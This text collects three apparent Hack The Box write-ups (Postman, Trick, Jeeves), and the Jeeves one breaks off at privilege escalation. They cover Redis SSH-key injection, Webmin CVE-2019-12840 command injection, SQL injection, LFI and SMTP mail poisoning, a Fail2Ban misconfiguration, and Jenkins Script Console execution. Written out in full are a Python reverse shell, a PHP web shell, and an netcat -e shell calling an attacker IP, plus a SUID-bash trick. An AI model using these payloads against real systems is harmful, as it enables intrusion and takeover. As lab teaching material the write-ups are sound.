Summary # Postman is an easy Linux machine centered around service misconfigurations and credential abuse. Initial access is obtained through an unauthenticated Redis instance, which can be abused to write an SSH public key and gain access to the system. Further enumeration reveals an encrypted private key that can be cracked to recover additional credentials. These credentials provide access to an outdated Webmin installation vulnerable to command injection. Exploiting the Webmin vulnerability results in root-level command execution, demonstrating the risks associated with exposed services and outdated administrative software.
Reconnaissance # Rustscan # We start with rustscan to quickly identify all the open ports from the total 65535 possible ports
└─$ rustscan -a <TARGET_IP> -r 0-65535 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 6379/tcp open redis syn-ack ttl 63 10000/tcp open snet-sensor-mgmt syn-ack ttl 63 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap <TARGET_IP> -T4 -sC -sV -p 22,80,6379,10000 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-22 08:21 +0500 Nmap scan report for <TARGET_IP> Host is up (0.39s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA) | 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA) |_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: The Cyber Geek's Personal Website |_http-server-header: Apache/2.4.29 (Ubuntu) 6379/tcp open redis Redis key-value store 4.0.9 10000/tcp open http MiniServ 1.910 (Webmin httpd) |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1). |_http-server-header: MiniServ/1.910 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Initial Access # Port 80 Enumeration # The port presents just a simple HTTP page and no other buttons or links on it. Trying to enumerate web directories with ffuf:
└─$ ffuf -u 'http://<TARGET_IP>/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://<TARGET_IP>/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ upload [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 409ms] images [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 4622ms] css [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 4624ms] fonts [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 340ms] js [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 5624ms] server-status [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 407ms] Only one directory from the above results stands out which is “upload” and it has directory listing enabled when viewed in browser but found nothing informational there
After checking for a while moved my enumeration efforts to other open ports.
Port 10000 Enumeration # Following the link on the port 10000 web page as the service is running in https mode. The website redirects us to a Webmin login page. Checking commonly used default credentials didn’t worked on the login form so copied the port 10000 server version “MiniServ/1.910” from the HTTP response in burpsuite and tried searching for common vulnerabilities. From the results “CVE-2019-12840” seems to be interesting one as it enables Remote Code Execution but the exploit conditions requires a valid username/password and the authorization to access the “/package-updates” endpoint. If we somehow find a valid credential this CVE may come in handy later.
Port 6379 Enumeration # On port 6379, a Redis server is running which after confirming allows unauthenticated access.
Redis (Remote Dictionary Server) is an open-source, in-memory NoSQL data structure store. It is widely used as a high-speed database, application cache, and message broker. By storing data in RAM rather than on a disk, Redis delivers sub-millisecond latency, making it ideal for real-time applications.
To connect to the server, we can use redis-cli:
└─$ redis-cli -h <TARGET_IP> -p 6379 Checking the Redis configured databases using “CONFIG GET databases” returned no useful information. Checking for the server information with “INFO” but seemingly no interesting information available except the server version “redis_version:4.0.9” which we already found via Nmap Scan.
Since Redis allows changing its database directory and filename through the CONFIG command, an unauthenticated Redis instance can potentially be abused to write arbitrary files if the Redis service account has sufficient filesystem permissions. Exploiting this misconfiguration, we can change Redis’s working directory to a user’s .ssh directory and check whether we can write an SSH key.
As redis can also be configured to use as a login account we can try changing to .ssh if the directory exists:
└─$ cat id_rsa.pub | redis-cli -h <TARGET_IP> -p 6379 -x set mykey └─$ redis-cli -h <TARGET_IP> -p 6379 CONFIG SET dir "/var/lib/redis/.ssh/" └─$ redis-cli -h <TARGET_IP> -p 6379 CONFIG SET dbfilename "authorized_keys" └─$ redis-cli -h <TARGET_IP> -p 6379 save We passed the output of SSH public key to redis-cli and using the SET option we wrote the key content to a redis key namely “mykey”
Then we changed the working directory to /var/lib/redis/.ssh/ and changed the Redis database filename to “authorized_keys” and forced Redis to write its data to disk using “SAVE”.
Trying to get a SSH shell via the private key using redis user and we successfully logged in:
└─$ ssh -i key redis@<TARGET_IP> With whoami, confirmed that we got the shell as redis. From /etc/passwd, we found only two normal users and the root account present on the system:
redis@Postman:~$ grep 'sh$' /etc/passwd root:x:0:0:root:/root:/bin/bash Matt:x:1000:1000:,,,:/home/Matt:/bin/bash redis:x:107:114::/var/lib/redis:/bin/bash Checking the directory of Matt user revealed that only Matt can itself access the user.txt flag file:
redis@Postman:~$ ls -l /home/Matt/ total 4 -rw-rw---- 1 Matt Matt 33 Jun 22 04:22 user.txt Gaining Access as Matt # In the /opt directory, found a backup of SSH RSA private key as "**id_rsa.bak**": redis@Postman:~$ ls -l /opt -rwxr-xr-x 1 Matt Matt 1743 Aug 26 2019 id_rsa.bak Viewing its content revealed that it is protected with some password:
With ssh2john, we can extract the password hash of the SSH key and try to crack with hashcat:
└─$ ssh2john id_rsa > ssh-Hash.txt To crack it, we can use the hashcat tool with mode 22911:
└─$ hashcat -m 22911 ssh-Hash.txt /usr/share/wordlists/rockyou.txt NOTE: Make sure that the hash content starts with “$sshng$0$8$” and remove the “id_rsa:” from the start so hashcat can identify it correctly for cracking
Hashcat successfully recovered the passphrase from the SSH private key.
Tried using the encrypted key to login via SSH but failed:
└─$ ssh -i id_rsa matt@<TARGET_IP> ** WARNING: connection is not using a post-quantum key exchange algorithm. ** This session may be vulnerable to "store now, decrypt later" attacks. ** The server may need to be upgraded. See https://openssh.com/pq.html Enter passphrase for key 'id_rsa': Connection closed by <TARGET_IP> port 22 After it, went on searching for other exploitation techniques but found none. Then from nowhere remembered that maybe the cracked password will work so tried using it with “su Matt” to switch login to Matt and it successfully worked.
redis@Postman:~$ su Matt Password: Matt@Postman:/var/lib/redis$ NOTE: The password worked with su because local user authentication was allowed. SSH authentication is controlled separately and password login may be disabled or restricted by SSH configuration.
Escalating Privileges # As we had a Webmin site before which we left testing because it needed a login credential, we can now successfully login to the site as searching for the default accounts for this site, we found out that it uses the local logins of the users so we can use the credentials of Matt.
In the Dashboard, we confirmed that the version of Webmin is indeed 1.910 and we previously found a Remote Code Execution CVE for this same version when we first checked the login page.
Finding the exploit techniques for this CVE revealed that the POST endpoint “/package-updates/update.cgi” has the “u” parameter which is vulnerable to command injection because its value is passed into a shell command without proper sanitization. Since we now have valid Matt credentials, the authentication requirement for this vulnerability is satisfied.
Exploiting CVE-2019-12840 # For the injection to work, we need to add another “u” parameter which starts with the semicolon, then command, then a terminating semicolon and then the “/apt”. The semicolons are used to break out of the expected command syntax. Everything before the first semicolon is treated as normal input, while the injected command executes before the trailing /apt value is processed.
To do it the manual way, we need to click the checkbox of any of the packages available to be updated and then click the “Update Selected Packages” button in the “/package-updates” endpoint.
Then send the POST request to the Repeater tab
In the Repeater tab, we need to add the following payload after the “apt” word
&u=;echo+Hacked;/apt So the whole request body will become:
mode=updates&search=&u=binutils%2Fapt&u=;echo+Hacked;/apt&ok_top=Update+Selected+Packages As the POST request tries to update a system package, so the HTTP response takes a bit longer that’s why we need to update the “Open-ended responses” timeout limit to 0 which will keep the connection open and waits until the whole response is received before showing us the output in Response tab. We can change the timeout in burpsuite in Settings > Network > Connections
After that send the request and wait for a minute or two. The response will contain the result of our command at the very end of the first <pre> HTML tag which we can search as
Gaining a Root Shell # To obtain a reverse shell, a Python socket-based reverse shell payload was generated with the attacker machine IP and listening port configured. The payload was then Base64 encoded to avoid issues with special characters during command injection.
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh") We can now send the following POST body through Repeater tab
mode=updates&search=&u=binutils%2Fapt&u=;python+-c+"import+base64;exec(base64.b64decode('<Encoded-Payload-Here>'))";/apt&ok_top=Update+Selected+Packages and start the netcat listener with:
└─$ rlwrap nc -lvnp 9090 After receiving the shell, we can confirm root privileges and read the root.txt flag.
summary: Explore Redis key injection, SSH access abuse, and Webmin CVE-2019-12840 privilege escalation on HTB Postman.
title: Postman Machine Writeup | HTB

content:
Summary # Trick is an easy Linux machine that combines web application exploitation with Linux privilege escalation. The attack begins with DNS enumeration to discover hidden virtual hosts, leading to a vulnerable Payroll Management System susceptible to SQL injection. The SQL injection can be leveraged to read sensitive files and uncover an additional virtual host containing a Local File Inclusion vulnerability. By abusing the mail system and the LFI, remote code execution is achieved, providing an initial shell on the target. Privilege escalation involves analyzing sudo permissions and exploiting a misconfigured Fail2Ban setup, ultimately resulting in root access through malicious configuration file execution.
Reconnaissance # Rustscan # We start with rustscan to quickly identify all the open ports from the total 65535 possible ports
└─$ rustscan -a <TARGET_IP> -r 0-65535 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 25/tcp open smtp syn-ack ttl 63 53/tcp open domain syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap <TARGET_IP> -T4 -sC -sV -p 22,25,53,80 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-21 11:08 +0500 Nmap scan report for <TARGET_IP> Host is up (0.39s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA) | 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA) |_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519) 25/tcp open smtp? |_smtp-commands: Couldn't establish connection on port 25 53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux) | dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian 80/tcp open http nginx 1.14.2 |_http-title: Coming Soon - Start Bootstrap Theme |_http-server-header: nginx/1.14.2 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Initial Access # Discovering Additional Virtual Hosts # Port 80 Enumeration # On port 80, we can see a Coming Soon page which only has email input field and nothing else.
Testing for hidden directories also didn’t yield anything important:
└─$ ffuf -u 'http://<TARGET_IP>/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://<TARGET_IP>/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ css [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 400ms] js [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 404ms] assets [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 396ms] Port 53 Enumeration # Using the DNS port, we can check for AXFR, ANY, A, MX, NS, TXT records using dig utility:
└─$ dig @<TARGET_IP> trick.htb AXFR In the output we saw that there is a vhost to trick.htb written as:
preprod-payroll.trick.htb. 604800 IN CNAME trick.htb. We can add both domains to the /etc/hosts file of our Linux host:
└─$ sudo nano /etc/hosts <TARGET_IP> trick.htb preprod-payroll.trick.htb Enumerating preprod-payroll.trick.htb # Visiting the newly found vhost redirects us to “/login” page. Checking for default credentials didn’t work so we moved to directory brute-forcing using ffuf again:
└─$ ffuf -u 'http://preprod-payroll.trick.htb/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://preprod-payroll.trick.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ database [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 399ms] assets [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 400ms] The 2 outputs redirect us to a 401 unauthorized page. Using .php file enumeration on the domain revealed following output:
└─$ ffuf -u 'http://preprod-payroll.trick.htb/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://preprod-payroll.trick.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ login.php [Status: 200, Size: 5571, Words: 374, Lines: 177, Duration: 412ms] ajax.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 418ms] index.php [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 420ms] home.php [Status: 200, Size: 486, Words: 180, Lines: 27, Duration: 343ms] header.php [Status: 200, Size: 2548, Words: 145, Lines: 46, Duration: 341ms] . [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 409ms] users.php [Status: 200, Size: 2197, Words: 103, Lines: 81, Duration: 419ms] readme.txt [Status: 200, Size: 149, Words: 5, Lines: 2, Duration: 421ms] db_connect.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 434ms] navbar.php [Status: 200, Size: 1382, Words: 68, Lines: 24, Duration: 409ms] db_connect.php showed nothing in response. The readme.txt file contained only the URL of the login page’s background image. None showed anything useful except the users.php file which revealed the following information and buttons on the page
Looking at the HTTP response in burpsuite we got the script tag which contained the following code
As the admin level user “Enemigosss” showing an ID of 1 in the 2nd last image, we can see what output the “manage_user.php?id=1” endpoint reveals.
The response for the HTTP request showed a login form containing the password in the value parameter. Checking it for validity on login page successfully logged us in.
Exploiting SQL Injection and LFI # The web application seems to be some sort of Employee Management system. None of the left pane options contained anything informational or interesting other than the username “john” which after confirming with SMTP port also failed with output that address doesn’t exist.
In the URL, we can see that the “?page” parameter contains the home value. Previously we found a home.php file in our file enumeration with ffuf step. Checking for simple LFI payloads like “../../../../../etc/passwd” failed. When appending the .php extension to the home value in URL, the output on the page “Welcome back…” stopped showing. This tells us that maybe in the backend code the .php extension is being appended to the parameter value automatically. This also failed our LFI payload to see the passwd file. I checked with php filters in the parameter value as:
php://filter/read=convert.base64-encode/resource=home The output came back as base64 encoded confirming that PHP filters are available to use but we can only fetch files which end in .php extension. Checking each file we previously found in files enumeration step and reading them with the PHP filters. In the db_connect.php, the credential for local MySQL database with username and password is present but the SSH login through them is not successful.
In the output of ajax.php, we found another file “admin_class.php” which contained the SQL queries for the entire web functions. Checking the SQL query for login function:
function login(){ extract($_POST); $qry = $this->db->query("SELECT * FROM users where username = '".$username."' and password = '".$password."' "); if($qry->num_rows > 0){ foreach ($qry->fetch_array() as $key => $value) { if($key != 'passwors' && !is_numeric($key)) $_SESSION['login_'.$key] = $value; } return 1; }else{ return 3; } } This function handles user login by taking the submitted username and password, inserting them directly into an SQL query, and creating a session if a matching user is found. It is vulnerable to SQL Injection because user input is concatenated into the query without validation or prepared statements. We can try the following SQLI payload on the login form:
admin' OR 1=1-- - The payload worked and we successfully logged in without the valid credentials. Copy the entire POST login request to the /login.php and write in a file to test it further with SQLMap tool. Running it with the following arguments:
└─$ sqlmap -r login-request.txt --dbms=mysql --batch --risk 3 --level 5 The tool confirmed a time-based SQL injection. As this SQLI technique will take hours to enumerate even a short file, we can look further if we can find some other SQL type. The SQLMap parameter “–technique=BEUSTQ” in default run checks for all techniques and stops when it finds one, we can simply remove the “T” letter which corresponds to Time Based SQLI. Following table shows what each character in the parameter means:
Character SQLI Technique B Boolean-based blind E Error-based U UNION query S Stacked queries T Time-based blind Q Inline queries To check for other techniques excluding Time based, we can use: └─$ sqlmap -r login-request.txt --dbms=mysql --batch --risk 3 --level 5 --technique=BEUSQ Kept checking all techniques until we found a Error Based SQLI payload. Using this technique is much faster and we can even use it to read local files like /etc/passwd using command:
└─$ qlmap -r login-request.txt --dbms=mysql --batch --risk 3 --level 5 --technique=E --file-read '/etc/passwd' The tool successfully fetches the output and saves in our local directory. We can see from the passwd file how many users are present on the system:
└─$ grep 'sh$' /path/to/passwd root:x:0:0:root:/root:/bin/bash michael:x:1001:1001::/home/michael:/bin/bash Seeing that username michael is present, we checked the already acquired credentials from the website and db_connect.php on the SSH but failed.
As the server is Nginx and hosts websites as Vhosts, we can search for interesting files related to Nginx. Searching for related files on Google showed the following ones:
From the above, enabled virtual hosts file looks promising as there maybe more custom virtual hosts running on the server. We can fetch the file with our SQLMap as:
└─$ sqlmap -r login-request.txt --dbms=mysql --batch --risk 3 --level 5 --technique=E --file-read '/etc/nginx/sites-enabled/default' In the output of the file, we found another vhost mentioned right above the “preprod-payroll” domain we already found
To access it, we need to add it to the /etc/hosts file along with the already written DNS mapping of the target server.
<TARGET_IP> preprod-payroll.trick.htb trick.htb preprod-marketing.trick.htb The website is again vulnerable to LFI but our payload is being filtered for the “../” sequences. Checking for bypasses online we found the following which keeps the traversal structure even if filter is applied:
/index.php?page=....//....//....//....//....//....//....//etc/passwd We confirmed the payload working but this time we had access to any file we want to read and not just files ending with .php extension.
Combining SMTP and LFI for RCE # The SMTP service supports the “VRFY” and “RCPT TO” functions which we use to confirm if a user exists on the server or not. Searching for techniques of exploitation of SMTP combined with the LFI, we found the one where we send the user an email address with a malicious attachment and then include it with our LFI to execute the file.
Linux mail storage depends on the configured mail format:
mbox format (default on many systems):
Emails are stored as a single file per user. Common locations are:
/var/mail/$USER /var/spool/mail/$USER All emails are appended sequentially inside that file.
Maildir format:
Emails are stored as individual files inside:
~/Maildir/ (or /home/$USER/Maildir/) The directory is divided into 3 subdirectories as:
Maildir/ ├── cur/ → Stores messages that have already been seen or opened ├── new/ → Stores newly delivered messages that the user hasn't read yet └── tmp/ → Stores temporary files during the email delivery process As we have LFI on a php application, we can send the user a web shell or reverse shell script. Swaks is a tool to work with SMTP emailing thing but we can do it manually as well:
└─$ netcat <TARGET_IP> 25 Trying 10.129.227.180... Connected to 10.129.227.180. Escape character is '^]'. HELO x 220 debian.localdomain ESMTP Postfix (Debian/GNU) 250 debian.localdomain MAIL FROM:atatcker 250 2.1.0 Ok RCPT TO:michael 250 2.1.5 Ok DATA 354 End data with <CR><LF>.<CR><LF> <?php system($_GET["cmd"]); ?> . 250 2.0.0 Ok: queued as 7C6564099C We interacted with the SMTP service using Netcat to send an email to the michael user. We connected to the SMTP server, provided the required SMTP commands, and placed a PHP payload in the email body. The mail was accepted by Postfix and queued for delivery, meaning the message should now exist in the user’s mailbox. Each of the commands we used are defined below:
HELO x — Introduces the sending client to the SMTP server and starts the mail session.
MAIL FROM:attacker — Specifies the sender address of the email.
RCPT TO:michael — Specifies the recipient mailbox where the email will be delivered.
DATA — Starts the email content section, allowing the message body and headers to be entered.
<?php system($_GET["cmd"]); ?> — PHP payload inserted into the email body (intended to execute system commands if processed as PHP).
. — Signals the end of the email content and submits the message to the SMTP server.
We can include the web shell using the URL:
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//var/mail/michael&cmd=nc+<ATTACKER_IP>+9090+-e+/bin/bash Make sure to already have opened the netcat listener:
└─$ netcat -lvnp 9090 NOTE: After the mail is delivered, the mail directory is auto cleaned after a while so we will need to resend the mail if command injection through the web-shell file doesn’t work
We can find the user.txt in the michael home directory at:
cat /home/michael/user.txt Looking in the .ssh directory, id_rsa and id_rsa.pub files are present. We can copy the id_rsa file’s content and use that to login with the private key as we don’t have the password for user.
└─$ chmod 600 id_rsa └─$ ssh -i id_rsa michael@<TARGET_IP> Escalating Privileges # Exploiting Fail2Ban Misconfiguration # Checking for sudo privileges with sudo -l, we got the following output:
michael@trick:~$ sudo -l Matching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restart Checking for privilege escalation techniques involving Fail2Ban, we found the PrivEsc method at exploitnotes.
We can check if there is any directory that is writable by our current user in the /etc/fail2ban:
michael@trick:~$ find /etc/writable -writable -ls 2>/dev/null 269281 4 drwxrwx--- 2 root security 4096 Jun 21 13:30 /etc/fail2ban/action.d We have action.d directory 777 privileges because our user michael is also present in the security group. To get the shell according to the technique mentioned in the blog post, we have to own the “iptables-multiport.conf” file and change the “actionban” variable to contain our payload. We can also make the /bin/bash binary get the SUID bit of root so we will not need to capture another shell. To do so:
michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/iptables-multiport.conf Then open the file in nano and change the variable actionban to contain the command “chmod 4755 /bin/bash”:
To do the remaining work, we can use the following one-liner:
michael@trick:~$ rm /etc/fail2ban/action.d/iptables-multiport.conf && cp /tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf && sudo /etc/init.d/fail2ban restart Then we need to perform 5 or more failed SSH login attempts so that the payload in the actionban variable triggers. For doing that automatically, we can use hydra:
└─$ hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://trick.htb After few seconds we can check the permissions of /bin/bash to confirm that the SUID bit is successfully applied on it and we can now privilege escalate to root:
michael@trick:~$ /bin/bash -p The root flag can now be read in the root’s directory:
bash-5.0# cat /root/root.txt
summary: Explore DNS zone transfers, SQL injection, LFI, SMTP mail poisoning, and Fail2Ban privilege escalation on HTB Trick.
title: Trick Machine Writeup | HTB

content:
Summary # Jeeves is a medium-difficulty Hack The Box machine that demonstrates how seemingly minor oversights can lead to full system compromise. The box begins with exploiting a vulnerable Jenkins instance to gain initial access, followed by Windows privilege escalation techniques that culminate in SYSTEM-level control. Its most distinctive learning point is the use of Alternate Data Streams (ADS), a lesser-known NTFS feature that conceals sensitive information from standard file listings. Overall, Jeeves provides valuable exposure to Windows enumeration, privilege escalation, and forensic awareness.
Reconnaissance # Rustscan # We start with rustscan to quickly identify all the open ports from the total 65535 possible ports
└─$ rustscan -a $TARGET_IP -r 0-65535 PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 50000/tcp open ibm-db2 syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap $TARGET_IP -T4 -sC -sV -p 80,135,445,50000 -Pn Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-19 09:12 +0500 Nmap scan report for $TARGET_IP Host is up (0.35s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Ask Jeeves 135/tcp open tcpwrapped 445/tcp open tcpwrapped 50000/tcp open tcpwrapped Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required |_clock-skew: mean: 5h03m04s, deviation: 0s, median: 5h03m03s | smb2-time: | date: 2026-06-19T09:15:39 |_ start_date: 2026-06-19T08:56:23 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Initial Access # SMB Enumeration # We start by enumerating the SMB shares via anonymous authentication:
└─$ sudo nxc smb $TARGET_IP -u '' -p '' --shares SMB $TARGET_IP 445 JEEVES [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True) SMB $TARGET_IP 445 JEEVES [-] Jeeves\: STATUS_ACCESS_DENIED SMB $TARGET_IP 445 JEEVES [-] Error enumerating shares: Error occurs while reading from remote(104) Anonymous access is not allowed but we now know the target machine is running Windows 10 Pro 10586 x64 with the hostname JEEVES.
Port 80 Enumeration # On port 80, we are presented with a search box and nothing else.
Typing anything in the search box redirects us to “/error.html?”. The page shows an image saying that the conversion of “Microsoft SQL Server 2005 - 9.00.4053.00” to int type failed and provides us a stack trace error:
We can see in the burpsuite history tab that no POST request is being sent to the server so this error image may be rendered client-side. Testing a few additional SQL injection payloads resulted in the same image each time so it is possible it is a rabbit hole just for distracting.
Port 50000 Enumeration # Opening the port 50000 in browser shows a 404 error page with the application server version as “Powered by Jetty:// 9.4.z-SNAPSHOT”
Since Jetty returned only a generic 404 page and disclosed its server version, it was likely hosting additional content behind undiscovered paths. Directory enumeration was therefore the next logical step.
For that, ffuf is a best tool which will quickly fuzz the endpoint with our provided wordlist:
└─$ ffuf -u 'http://$TARGET_IP:50000/FUZZ' -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://$TARGET_IP:50000/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ askjeeves [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 405ms] The results showed a single directory with a 302 status code. Opening the link in a browser reveals a Jenkins instance running without authentication.
What is Jenkins?
Jenkins is an open-source automation server commonly used for CI/CD pipelines. Administrators can automate software builds, testing, and deployments through Jenkins jobs and plugins.
We can perform Remote Code Execution from a Jenkins application if we can get access to the “Script Console”. Navigating to the “Manage Jenkins” button in the left menu, we see different features from Jenkins one of which is the “Script Console”
Jenkins administrators can execute Groovy scripts through the Script Console. Since these scripts run directly on the Jenkins server, access to this feature effectively provides remote code execution on the underlying operating system.
What is Groovy?
Groovy is a Java-based scripting language used internally by Jenkins. Scripts executed through the Jenkins Script Console run with the permissions of the Jenkins service account and can directly interact with the operating system.
To perform the command “whoami”, we can write following groovy script in the input box and press “Run”:
def cmd = 'whoami' def sout = new StringBuffer(), serr = new StringBuffer() def proc = cmd.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println sout The output showed us that the application is running under the context of user “jeeves\kohsuke”:
After confirming code execution, we can leverage the Script Console to spawn a PowerShell reverse shell and obtain interactive access to the target.
To get a reverse shell, we can generate a payload from https://revshells.com. We will use “PowerShell #3 (Base64)”. Make sure to replace the IP according to your tun0 address and port according to your choosing
Copy the payload and replace in the following reverse shell groovy script:
r = Runtime.getRuntime() p = r.exec(["cmd.exe","/c","<Reverse-Shell-Payload-Here>"] as String[]) p.waitFor() Open the netcat listener with:
└─$ rlwrap nc -lvnp <PORT> As soon as we click the “Run” button, we will receive a reverse shell. We can find the user.txt in “C:\Users\kohsuke\Desktop\user.txt”
Escalating Privileges # Checking the group membership of our user, we didn’t find anything useful. Checking the assigned privileges with “whoami /privs” revealed the following:
